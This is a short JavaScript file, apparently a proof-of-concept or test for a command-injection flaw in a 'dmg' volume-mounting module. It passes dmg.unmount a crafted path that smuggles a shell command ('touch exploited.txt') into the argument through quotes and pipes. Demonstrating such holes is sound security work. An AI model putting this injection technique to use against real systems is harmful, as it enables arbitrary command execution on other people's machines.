'use strict'

const dmg = require('../src');

dmg.unmount('" | touch exploited.txt | echo /Volumes/ "', function() {});

